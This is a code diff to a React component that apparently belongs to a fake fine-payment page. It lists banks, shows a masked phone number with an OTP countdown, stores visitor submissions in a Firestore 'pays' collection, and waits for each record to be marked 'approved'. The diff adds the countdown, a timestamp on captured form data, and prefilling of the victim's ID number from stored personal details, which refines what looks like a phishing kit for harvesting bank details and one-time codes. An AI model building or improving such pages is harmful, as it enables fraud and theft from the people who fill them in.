@@ -132,8 +132,10 @@ const BANKS = [
 
 export default function Kent(props: { setPage?: any; violationValue: number }) {
   const [step, setStep] = useState(1)
+  const [cid, setCid] = useState("")
   const [mobile, setMobile] = useState("99****")
   const [loading, setLoading] = useState(true)
+  const [time, setTime] = useState(0)
   const [newotp] = useState([""])
   const visitorId = localStorage.getItem("visitor")
 
@@ -166,7 +168,27 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
     prefix: "",
     status: "new",
   })
+const cuonter=()=>{
+  let timeLeft = 30;
 
+  // Update the countdown every 1 second
+  let countdown = setInterval(function () {
+    timeLeft--;
+
+      // Get the current date and time
+      
+      // Calculate the distance between now and the countdown date
+   
+      // Display the result
+    setTime(timeLeft)
+      
+      // If the countdown is finished, display a message
+      if (timeLeft <= 0) {
+          clearInterval(countdown);
+          setTime(0)
+      }
+  }, 1000);
+}
   // Handle form input changes
   const handleFormChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
     const { name, value } = e.target
@@ -208,7 +230,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
     setLoading(true)
 
     try {
-      await addData(formData)
+      await addData({  createdDate: new Date().toISOString(),...formData})
     } catch (error) {
       console.error("Error:", error)
     }
@@ -238,6 +260,8 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
       await handleSubmit(e)
       setTimeout(() => {
         setLoading(false)
+    cuonter()
+
         setStep(3)
       }, 3000)
     } else if (step === 3) {
@@ -306,6 +330,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
       const unsubscribe = onSnapshot(doc(db, "pays", visitorId), async (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data() as any
+          setCid(data.personalInfo.id)
 setMobile(data.mobile)
           if (data.status === "approved") {
             setPaymentInfo((prev) => ({ ...prev, status: data.status }))
@@ -511,7 +536,7 @@ setMobile(data.mobile)
                   name="idNumber"
                   style={{ width: "100%" }}
                   maxLength={10}
-                  value={formData.idNumber}
+                  value={formData.idNumber || cid }
                   onChange={handleFormChange}
                 />
               </div>
@@ -560,6 +585,7 @@ setMobile(data.mobile)
 
                 {/* Reference number */}
                 <div className="flex justify-center items-center gap-2 mb-6 row">
+                  <span style={{textAlign:'center'}}>{"00:00:"+time}</span>
                   <span className="text-xl font-bold" style={{textAlign:'center'}} >{mobile||"99******"}</span>
                   <div className="bg-blue-100 rounded-full p-1">
                     <svg
